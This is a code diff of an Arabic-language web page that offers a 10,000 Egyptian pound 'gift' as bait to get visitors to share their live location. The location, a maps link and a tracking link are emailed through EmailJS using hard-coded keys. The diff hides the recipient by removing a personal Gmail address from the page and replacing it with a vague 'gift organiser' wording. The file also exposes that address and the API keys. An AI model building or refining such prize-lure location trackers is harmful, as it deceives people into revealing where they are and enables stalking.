@@ -29,7 +29,7 @@ main{width:min(760px,100%);margin:auto}.head{text-align:center;padding:20px 8px 
 <div style="font-size:clamp(34px,9vw,48px);font-weight:850;color:#8c6a2c;line-height:1.25">10,000 جنيه</div>
 <div style="font-size:13px;color:#68796b;margin-top:6px">عشرة آلاف جنيه مصري</div>
 </div>
-<p class="muted" style="text-align:center">لو حابب تشارك موقعك، اضغط على الزر بالأسفل. سيطلب المتصفح إذنك أولاً، وإذا وافقت فسيتم إرسال موقعك ورابط مشاهدته إلى البريد الموضح. مشاركة الموقع اختيارية ويمكنك إيقافها في أي وقت.</p>
+<p class="muted" style="text-align:center">لو حابب تشارك موقعك، اضغط على الزر بالأسفل. سيطلب المتصفح إذنك أولاً، وإذا وافقت فسيتم إرسال موقعك ورابط مشاهدته إلى البريد الإلكتروني الخاص بمنظّم الهدية. مشاركة الموقع اختيارية ويمكنك إيقافها في أي وقت.</p>
 <button class="primary wide" id="startBtn">مشاركة موقعي الآن</button>
 <button class="danger wide" id="stopBtn" disabled style="margin-top:10px">إيقاف مشاركة الموقع</button>
 <div class="status" id="shareStatus" role="status" aria-live="polite">الهدية بانتظارك. لم يتم طلب موقعك بعد.</div>
@@ -101,7 +101,7 @@ async function sendLocationEmail(point){
   const mapsLink="https://www.google.com/maps?q="+encodeURIComponent(point.lat+","+point.lng);
   await emailjs.send("service_jor0rdv","template_ttechpb",{room_link:$("shareLink").value,recipient_name:"",latitude:String(point.lat),longitude:String(point.lng),accuracy:String(Math.round(point.accuracy||0)),maps_link:mapsLink,started_at:new Date(point.updatedAt).toLocaleString("ar-EG")},{publicKey:"zdsXpJ6teuY23xJ1E"});
   emailSent=true;$("retryEmailBtn").classList.add("hidden");
-  status("shareStatus","تم إرسال رسالة الموقع تلقائياً إلى pesomohammed1@gmail.com بنجاح. مشاركة الموقع مستمرة ويمكنك إيقافها في أي وقت.","good");
+  status("shareStatus","تم إرسال رسالة الموقع تلقائياً إلى البريد الإلكتروني الخاص بمنظّم الهدية بنجاح. مشاركة الموقع مستمرة ويمكنك إيقافها في أي وقت.","good");
  }catch(mailError){
   $("retryEmailBtn").classList.remove("hidden");
   status("shareStatus","موقعك يُشارك، لكن تعذر إرسال البريد: "+(mailError?.text||mailError?.message||"خطأ غير معروف")+". يمكنك إعادة المحاولة بالزر الظاهر.","warn");
